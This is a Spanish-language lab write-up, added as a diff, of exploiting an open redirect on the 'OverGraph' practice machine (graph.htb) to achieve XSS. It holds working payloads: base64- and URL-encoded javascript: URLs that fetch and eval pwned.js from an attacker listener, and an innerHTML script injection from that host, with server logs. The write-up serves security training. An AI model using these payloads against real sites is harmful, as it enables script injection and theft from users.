@@ -1,0 +1,63 @@
+[*] Maquina practida OverGraph
+[*] Nos aprovechamos de un openredirect para ejecutar comandos xss en el servidor victima
+[*] Pagina de donde e puesto en practica el xss -> https://book.hacktricks.xyz/pentesting-web/open-redirect
+
+  url -> http://graph.htb
+  route -> http://graph.htb/?redirect=
+
+[*] Para saber que ?redirect= existe, en el codigo fuente de la pagina web se ve el siguiente codigo.
+
+  <!DOCTYPE html>
+  <html lang="en" >
+  <head>
+  <script>
+  let param = window.location.search.split('=');
+	
+  if(param[0] === "?redirect"){
+  	window.location.replace(param[1]);
+  }
+
+[*] Esto hace referencia a que hay un parametro en el sistema llamado ?redirect en el cual podemos ponerle una equivalencia.
+
+[*] Empezamos a probar ataques de xss en el servidor de esta forma
+
+  http://graph.htb/?redirect=javascript:alert(1);
+
+[*] En este caso vemos que nos lo hace asi que vamos a hacer lo siguiente.
+
+  http://graph.htb/?redirect=javascript:eval(atob("Mis4Cg%3d%3d"))
+  
+  [+] En este caso ejecutaremos esta instruccion en la cual la operacion esta encodeada con base64, realmente la operacion seria esta 2+8, y el resultado es este Mis4Cg==, lo que haremos sera 
+      encodear en urlencode los == ya que si no, no nos lo interpreta. Tambien es recomendable encodear la "
+
+  [+] Output:
+      
+      10
+
+[*] Ahora intentaremos hacer una peticion a nuestro servidor en escucha por el puerto 80, a traves de este servidor de la siguiente manera
+
+  [+] Input:
+    http://graph.htb/?redirect=javascript:eval(atob(%22ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC41Ny9wd25lZC5qcycpLnRoZW4ocj0+ci50ZXh0KCkudGhlbihldmFsKSkK%22))
+
+  [+] Teoria:
+    Este input es debido a que queremos que nos haga el servidor una peticion a nuestro servidor que tenemos en escucha, por lo cual he puesto en formato plain text este payload
+    fetch('http://10.10.14.57/pwned.js').then(r=>r.text().then(eval)), con esto lo que vamos a hacer es llegar a hacer una peticion a nuestro server. Lo encodeamos en base64 para no tener problemas      para que me lo interprete. Despues de pasarlo a base64 lo pondremos entre las comillas del atob
+  
+  [+] Output:
+    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+    10.10.14.57 - - [13/Aug/2022 10:43:58] code 404, message File not found
+    10.10.14.57 - - [13/Aug/2022 10:43:58] "GET /pwned.js HTTP/1.1" 404 -
+
+[*] En el caso de modificar pwned.js y ponerle un <script>alert('XSS')</script>, con el fetch no nos lo representara en la maquina, asi que tendremos que usar otra manera para que nos lo represente
+[*] Usaremos el metodo document.body.innerHTML para que nos lo interprete
+
+    [*] Input:
+      http://graph.htb/?redirect=javascript:%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%69%6e%6e%65%72%48%54%4d%4c%3d%28%27%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%35%37%2f%70%77%6e%65%64%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e%27%29
+
+    [*] Teoria:
+      Ahora ejecutaremos la siguiente tecnica -> document.body.innerHTML=('<script src="http://10.10.14.57/pwned.js"></script>')
+      Para usarla de una forma correcta tendremos que encodearla en urlencode, para que nos la pueda interpretar de una buena manera, ahora no usamos el base64, para encodearla en url, usare
+      el Decode de burpsuite, gracias a esto el input queda tan ilegible.
+
+    [*] Output:
+      XSS
